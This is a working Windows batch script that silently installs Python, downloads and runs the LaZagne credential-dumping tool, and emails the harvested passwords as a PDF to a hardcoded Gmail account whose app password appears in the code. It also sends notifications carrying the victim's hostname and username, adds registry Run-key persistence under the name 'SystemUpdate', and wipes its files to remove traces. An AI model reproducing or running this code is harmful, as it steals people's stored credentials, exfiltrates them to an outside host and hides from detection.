@echo off
setlocal enabledelayedexpansion

:: Environmental variables for all dependencies
set LAZAGNE_DIR=%TEMP%\LaZagne-master
set LAZAGNE_ZIP=%TEMP%\LaZagne-master.zip
set VENV_DIR=%TEMP%\venv
set LOG_DIR=%TEMP%\logs
set SCRIPT_DIR=%TEMP%\.system_update.bat
set RESULTS_FILE=%TEMP%\lazagne_full_results.txt
set PDF_FILE=%TEMP%\lazagne_results.pdf
set CRON_LOG=%TEMP%\lazagne_cron.log
set PYTHON_SCRIPT=%TEMP%\lazagne_script.py

:: Main execution
echo Starting Windows LaZagne operation...
echo This may take several minutes. Please wait...

:: Create log directory
mkdir "%LOG_DIR%" 2>nul

:: Install Python if needed
call :install_python
if !errorlevel! neq 0 (
    echo Python installation failed.
    call :cleanup
    exit /b 1
)

:: Install packages
call :install_packages
if !errorlevel! neq 0 (
    echo Package installation failed.
    call :cleanup
    exit /b 1
)

:: Create Python script
call :create_python_script

:: Run Python script
echo Running LaZagne...
python "%PYTHON_SCRIPT%"
if !errorlevel! neq 0 (
    echo Python script execution failed.
    call :cleanup
    exit /b 1
)

:: Final cleanup
call :cleanup

echo Operation completed successfully. All temporary files cleaned up.
pause
exit /b 0

:: Cleanup function to remove all traces
:cleanup
echo Starting cleanup process...

:: Remove installed files and directories
del /f /q "%LAZAGNE_ZIP%" "%RESULTS_FILE%" "%PDF_FILE%" "%CRON_LOG%" "%PYTHON_SCRIPT%" "%SCRIPT_DIR%" 2>nul
rd /s /q "%LAZAGNE_DIR%" "%VENV_DIR%" "%LOG_DIR%" 2>nul

:: Remove other temporary files
del /f /q "%TEMP%\LaZagne*" "%TEMP%\venv*" "%TEMP%\.system_update*" "%TEMP%\lazagne_*" 2>nul
del /f /q "%TEMP%\reportlab*" "%TEMP%\fpdf*" "%TEMP%\python*" "%TEMP%\pip*" 2>nul
rd /s /q "%TEMP%\LaZagne*" "%TEMP%\venv*" 2>nul

:: Clear Python cache
for /r "%TEMP%" %%f in (*.pyc *.pyo) do del /f /q "%%f" 2>nul
for /d /r "%TEMP%" %%d in (__pycache__) do rd /s /q "%%d" 2>nul

echo Cleanup completed. All traces removed.
goto :eof

:: Install Python if not present
:install_python
echo Checking for Python...
python --version >nul 2>&1
if !errorlevel! equ 0 (
    echo Python is already installed.
    goto :eof
)

echo Installing Python...
curl -fsSL https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o "%TEMP%\python_installer.exe" >nul 2>&1
if !errorlevel! neq 0 (
    echo Failed to download Python installer.
    exit /b 1
)

:: Silent install Python
start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 >nul 2>&1
del /f /q "%TEMP%\python_installer.exe" 2>nul

:: Refresh PATH to include Python
for %%i in (python.exe) do set "PYTHON_EXE=%%~$PATH:i"
if not defined PYTHON_EXE (
    set PATH=%PATH%;C:\Python310;C:\Python310\Scripts
)

python --version >nul 2>&1
if !errorlevel! neq 0 (
    echo Python installation failed.
    exit /b 1
)

echo Python installed successfully.
goto :eof

:: Install required Python packages
:install_packages
echo Installing required Python packages...

:: Upgrade pip
python -m pip install --upgrade pip --quiet >nul 2>&1

:: Install packages
python -m pip install --quiet reportlab fpdf requests beautifulsoup4 lxml pillow cryptography pycryptodome psutil >nul 2>&1

:: Check if packages installed successfully
python -c "import reportlab, fpdf" 2>nul
if !errorlevel! neq 0 (
    echo Failed to install required packages.
    exit /b 1
)

echo Packages installed successfully.
goto :eof

:: Create Python script
:create_python_script
(
echo import smtplib, ssl, socket, os, getpass, subprocess, sys, time, tempfile, shutil
echo from email.mime.text import MIMEText
echo from email.mime.multipart import MIMEMultipart
echo from email.mime.application import MIMEApplication
echo.
echo # Set environmental variables from batch
echo LAZAGNE_DIR = os.environ.get("LAZAGNE_DIR", r"%LAZAGNE_DIR%")
echo LAZAGNE_ZIP = os.environ.get("LAZAGNE_ZIP", r"%LAZAGNE_ZIP%")
echo RESULTS_FILE = os.environ.get("RESULTS_FILE", r"%RESULTS_FILE%")
echo PDF_FILE = os.environ.get("PDF_FILE", r"%PDF_FILE%")
echo.
echo # Try to import reportlab with fallback
echo try:
echo     from reportlab.lib.pagesizes import letter
echo     from reportlab.pdfgen import canvas
echo     reportlab_available = True
echo except ImportError:
echo     reportlab_available = False
echo     # Try to install it
echo     try:
echo         subprocess.run([sys.executable, "-m", "pip", "install", "reportlab"], 
echo                       capture_output=True, check=True, shell=True)
echo         from reportlab.lib.pagesizes import letter
echo         from reportlab.pdfgen import canvas
echo         reportlab_available = True
echo     except:
echo         reportlab_available = False
echo.
echo try:
echo     import fpdf
echo     fpdf_available = True
echo except ImportError:
echo     fpdf_available = False
echo     # Try to install it
echo     try:
echo         subprocess.run([sys.executable, "-m", "pip", "install", "fpdf"], 
echo                       capture_output=True, check=True, shell=True)
echo         import fpdf
echo         fpdf_available = True
echo     except:
echo         fpdf_available = False
echo.
echo def send_email(subject, body, attachment_path=None):
echo     try:
echo         gmail_user = "github0987@gmail.com"
echo         gmail_app_password = "gwhl efna quvk qhqj"
echo.        
echo         msg = MIMEMultipart()
echo         msg["From"] = gmail_user
echo         msg["To"] = gmail_user
echo         msg["Subject"] = subject
echo         msg["X-Priority"] = "1"
echo.        
echo         msg.attach(MIMEText(body, "plain"))
echo.        
echo         if attachment_path and os.path.exists(attachment_path):
echo             with open(attachment_path, "rb") as f:
echo                 part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
echo             part["Content-Disposition"] = f"attachment; filename=\\"{os.path.basename(attachment_path)}\\""
echo             msg.attach(part)
echo.        
echo         context = ssl.create_default_context()
echo         with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
echo             server.login(gmail_user, gmail_app_password)
echo             server.sendmail(gmail_user, gmail_user, msg.as_string())
echo         return True
echo     except Exception as e:
echo         return False
echo.
echo def create_pdf(content, filename):
echo     if reportlab_available:
echo         try:
echo             c = canvas.Canvas(filename, pagesize=letter)
echo             text = c.beginText(40, 750)
echo             text.setFont("Helvetica", 10)
echo.            
echo             lines = []
echo             for line in content.split("\n"):
echo                 while len(line) > 100:
echo                     lines.append(line[:100])
echo                     line = line[100:]
echo                 lines.append(line)
echo.            
echo             for line in lines:
echo                 if text.getY() < 40:
echo                     c.drawText(text)
echo                     c.showPage()
echo                     text = c.beginText(40, 750)
echo                     text.setFont("Helvetica", 10)
echo                 text.textLine(line)
echo.            
echo             c.drawText(text)
echo             c.save()
echo             return True
echo         except Exception as e:
echo             pass
echo.    
echo     if fpdf_available:
echo         try:
echo             pdf = fpdf.FPDF()
echo             pdf.add_page()
echo             pdf.set_font("Arial", size=10)
echo.            
echo             for line in content.split("\n"):
echo                 pdf.cell(0, 5, line[:90], ln=True)
echo.            
echo             pdf.output(filename)
echo             return True
echo         except Exception as e:
echo             pass
echo.    
echo     try:
echo         with open(filename.replace(".pdf", ".txt"), "w") as f:
echo             f.write(content)
echo         return False
echo     except:
echo         return False
echo.
echo # Get system info
echo username = getpass.getuser()
echo hostname = socket.gethostname()
echo system_os = "Windows"
echo.
echo # Send initial notification
echo send_email("Python Installation Started", "Python installation initiated on " + hostname + " (" + system_os + ") - User: " + username)
echo.
echo # Install LaZagne and run
echo try:
echo     lazagne_repo_url = "https://github.com/AlessandroZ/LaZagne/archive/master.zip"
echo.    
echo     # Download the repository
echo     result = subprocess.run(["curl", "-fsSL", "-o", LAZAGNE_ZIP, lazagne_repo_url], 
echo                           capture_output=True, text=True, shell=True)
echo.    
echo     if result.returncode != 0:
echo         # Try with powershell if curl fails
echo         try:
echo             import urllib.request
echo             urllib.request.urlretrieve(lazagne_repo_url, LAZAGNE_ZIP)
echo         except:
echo             send_email("LaZagne Download Failed", "Download failed: " + result.stderr)
echo             sys.exit(1)
echo.    
echo     # Extract the repository
echo     try:
echo         import zipfile
echo         with zipfile.ZipFile(LAZAGNE_ZIP, 'r') as zip_ref:
echo             zip_ref.extractall(os.path.dirname(LAZAGNE_ZIP))
echo     except:
echo         send_email("LaZagne Extraction Failed", "Extraction failed")
echo         sys.exit(1)
echo.    
echo     send_email("LaZagne Downloaded", "LaZagne successfully downloaded and extracted on " + hostname)
echo.    
echo     # Windows LaZagne path
echo     lazagne_script_path = os.path.join(LAZAGNE_DIR, "Windows", "laZagne.exe")
echo     if not os.path.exists(lazagne_script_path):
echo         lazagne_script_path = os.path.join(LAZAGNE_DIR, "Windows", "laZagne.py")
echo.    
echo     # Install LaZagne requirements
echo     requirements_path = os.path.join(LAZAGNE_DIR, "requirements.txt")
echo     if os.path.exists(requirements_path):
echo         subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_path], 
echo                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
echo.    
echo     # Run LaZagne and capture output
echo     if lazagne_script_path.endswith('.exe'):
echo         cmd = [lazagne_script_path, "all"]
echo     else:
echo         cmd = [sys.executable, lazagne_script_path, "all"]
echo.    
echo     process = subprocess.Popen(cmd, 
echo                              stdout=subprocess.PIPE, 
echo                              stderr=subprocess.PIPE,
echo                              stdin=subprocess.DEVNULL,
echo                              shell=True)
echo.    
echo     # Wait for completion and get results
echo     stdout, stderr = process.communicate()
echo     lazagne_output = stdout.decode() if stdout else stderr.decode()
echo.    
echo     # Create PDF with results
echo     pdf_created = create_pdf(lazagne_output, PDF_FILE)
echo.    
echo     # Send LaZagne results via email with PDF attachment
echo     results_subject = "LaZagne Results from " + hostname
echo     time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
echo     results_body = "System: " + hostname + " (" + system_os + ")\\nUser: " + username + "\\nTime: " + time_str
echo.    
echo     if pdf_created:
echo         send_email(results_subject, results_body, PDF_FILE)
echo     else:
echo         results_body += "\\n\\nLaZagne Output:\\n" + lazagne_output[:1500]
echo         send_email(results_subject, results_body)
echo.    
echo     # Save full results to file
echo     with open(RESULTS_FILE, "w") as f:
echo         f.write("System: " + hostname + "\\nUser: " + username + "\\nOS: " + system_os + "\\n\\n")
echo         f.write(lazagne_output)
echo.    
echo     send_email("Full Results Saved", "Full LaZagne results saved to " + RESULTS_FILE + " on " + hostname)
echo.    
echo     # Setup persistence via registry
echo     try:
echo         import winreg
echo         key = winreg.HKEY_CURRENT_USER
echo         subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
echo.        
echo         with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
echo             winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, SCRIPT_DIR)
echo         send_email("Persistence Established", "Registry persistence configured on " + hostname)
echo     except:
echo         pass
echo.    
echo except Exception as e:
echo     send_email("LaZagne Execution Failed", "Error: " + str(e) + " on " + hostname)
echo.
echo # Final success notification
echo time_str = time.strftime("%%Y-%%m-%%d %%H:%%M:%%S")
echo send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)
echo.
echo print("All operations completed successfully. Check your email for details.")
echo.
echo # Python-level cleanup
echo try:
echo     # Remove any temporary Python files
echo     for temp_file in [LAZAGNE_ZIP, PDF_FILE, RESULTS_FILE]:
echo         if os.path.exists(temp_file):
echo             os.remove(temp_file)
echo.    
echo     # Remove directories
echo     if os.path.exists(LAZAGNE_DIR):
echo         shutil.rmtree(LAZAGNE_DIR)
echo.    
echo     # Clear Python cache
echo     for root, dirs, files in os.walk(os.environ["TEMP"]):
echo         for file in files:
echo             if file.endswith(".pyc") or file.endswith(".pyo"):
echo                 os.remove(os.path.join(root, file))
echo         for dir in dirs:
echo             if dir == "__pycache__":
echo                 shutil.rmtree(os.path.join(root, dir))
echo.                
echo except:
echo     pass
) > "%PYTHON_SCRIPT%"

goto :eof
